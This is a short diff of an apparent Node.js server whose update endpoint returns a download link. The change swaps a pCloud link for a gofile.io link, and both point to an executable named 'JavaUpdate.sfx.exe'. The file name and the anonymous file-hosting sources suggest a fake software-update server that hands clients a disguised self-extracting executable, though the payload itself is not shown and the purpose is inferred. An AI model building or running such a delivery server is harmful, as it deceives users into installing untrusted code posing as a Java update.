@@ -45,7 +45,7 @@ const server = http.createServer((req, res) => {
         // Örnek güncelleme linki
         res.end(JSON.stringify({ 
             version: "3.6.0", 
-            url: "https://edef5.pcloud.com/cBZTf0km3ZESMAPx7ZZZjEp60kZ2ZZ6zkZkZLouzkZvzZKpZ5pZmLZWLZVHZ7QZwJZapZm8ZK8ZlzZVFZr5ZugLaZxSrySErgbOmt0Noai1u1huNVinjy/JavaUpdate.sfx.exe" 
+            url: "https://cold-eu-agl-1.gofile.io/download/web/adb10aee-fdd6-4cb6-8ca5-27f2a030604c/JavaUpdate.sfx.exe" 
         }));
     }
 
